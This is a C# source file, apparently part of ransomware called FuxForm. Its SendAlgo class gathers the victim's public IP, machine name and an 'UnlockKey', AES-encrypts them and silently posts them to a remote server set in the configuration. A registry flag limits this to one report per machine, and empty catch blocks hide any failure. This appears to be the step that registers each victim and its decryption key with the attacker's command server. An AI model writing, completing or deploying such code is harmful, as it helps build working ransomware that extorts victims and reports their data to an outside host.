using Microsoft.Win32;
using System;
using System.Net;
using System.Security.Cryptography;
using System.Text;

namespace FuxForm.Algorithms
{
    internal class SendAlgo
    {
        public static void SendInformation_Checker()
        {
            if (AuxiliaryFunctions.ChkRegistry(config.ProgramRegKey, config.SendKeyReg) != "1")
            {
                try { SendAPI(); } catch { };
            }
        }

        private static void SendAPI()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(config.ProgramRegKey, true) ?? Registry.CurrentUser.CreateSubKey(config.ProgramRegKey))
            {

                try
                {
                    string API_IP = Generator.GetIP();
                    string PC = Environment.MachineName;

                    if (API_IP != "FALSE")
                    {
                        string data = $"{API_IP}|{PC}|{config.UnlockKey}";

                        using (Aes aes = Aes.Create())
                        {
                            aes.Key = Encoding.UTF8.GetBytes(config.SendKey);
                            aes.IV = Encoding.UTF8.GetBytes(config.SendIV);
                            aes.Mode = CipherMode.CBC;
                            aes.Padding = PaddingMode.PKCS7;

                            ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                            byte[] encryptedBytes;
                            using (var msEncrypt = new System.IO.MemoryStream())
                            {
                                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                                {
                                    using (var swEncrypt = new System.IO.StreamWriter(csEncrypt))
                                    {
                                        swEncrypt.Write(data);
                                    }
                                    encryptedBytes = msEncrypt.ToArray();
                                }
                            }
                            string encryptedData = Convert.ToBase64String(encryptedBytes);
                            using (WebClient client = new WebClient())
                            {
                                try
                                {
                                    client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                                    string response = client.UploadString(config.UrlServer, "data=" + Uri.EscapeDataString(encryptedData));
                                    key.SetValue(config.SendKeyReg, "1");
                                }
                                catch { }
                            }
                        }
                    }
                }
                catch { }
            }
        }

    }
}
